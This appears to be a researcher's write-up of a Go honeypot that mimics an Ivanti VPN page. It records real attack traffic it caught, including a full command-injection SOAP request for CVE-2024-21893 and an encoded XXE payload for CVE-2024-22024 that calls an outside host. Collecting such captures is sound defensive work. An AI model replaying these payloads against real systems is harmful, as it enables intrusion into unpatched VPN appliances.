Due to the Ivanti Vulnerabilities that have been prevelant recently created a small honeypot in golang.  It will respond to anything by sending the link to the VPN welcome page and then it will capture what is being sent.

You can customize the honeypot with the following options:

```text
Usage 
  -https string
        Disable site from running HTTPS (default: -https true) (default "true")
  -port string
        Change default listening port (default: -port 9000) (default "9000")
  -user string
        Change default user (default: -user nobody) (default "nobody")
```

Current command I am using to execute the honeypot and use tee for logging.  I also combine it with screen or tmux to background the stdout.  Any POST information will be saved to a random file in the folder postInfo.

```bash
./ihp -user nobody -port 443 | tee -a honeypotOutput.txt &
```


![Honeypot](/projects/honeypots/ivantiHoneypot/honeypot.png)

## Research Collected from the Honeypot

### CVE-2024-21893
Description: If the exploit is successful it creates the file in the CSS directory, the automation of the exploitation checks to see if the file is created.

Github POCs: Exist
Date: 06 Feb 24 05:36 UTC 
Method: POST URL: /dana-ws/saml20.ws
Method: GET URL: /dana-na/css/q1WdZI.css (Observed saving to the CSS directory)
Method: GET URL: /dana-na/help/241.gif (Observed saving to the help directory)

```POST Example
<?xml version="1.0" encoding="UTF-8"?>
    <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
            <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
                <ds:SignedInfo>
                    <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
                    <ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>
                </ds:SignedInfo>
                <ds:SignatureValue>qwerty</ds:SignatureValue>
                <ds:KeyInfo xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.w3.org/2000/09/xmldsig#" xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
                    <ds:RetrievalMethod URI="http://127.0.0.1:8090/api/v1/license/keys-status/%3Bid%20%3E%20/home/webserver/htdocs/dana-na/css/qz0fPQ.css%3B"/>
                    <ds:X509Data/>
                </ds:KeyInfo>
                <ds:Object></ds:Object>
            </ds:Signature>
        </soap:Body>
    </soap:Envelope>
```


### CVE-2024-22024
Description: If the exploit is successful it creates the file in the CSS directory, the automation of the exploitation checks to see if the file is created.

Github POCs: Exist
Date: 16 Feb 24 04:34 UTC 
Method: POST URL: /dana-na/auth/saml-sso.cgi
Method: GET URL: /dana-na/css/pawsu1.css

```POST Example
SAMLRequest=PD94bWwgdmVyc2lvbj0iMS4wIiA%2FPjwhRE9DVFlQRSByb290IFs8IUVOVElUWSAlIHh4ZSBTWVNURU0gImh0dHA6Ly8xNDMuMTEwLjI1NC4xMjYvZnVfMzUuOTAuNjkuMjM3Ij4gJXh4ZTtdPjxyPjwvcj4%3D
```

I used cyberchef to base64 decode, url decode, etc. to see the payload being sent.


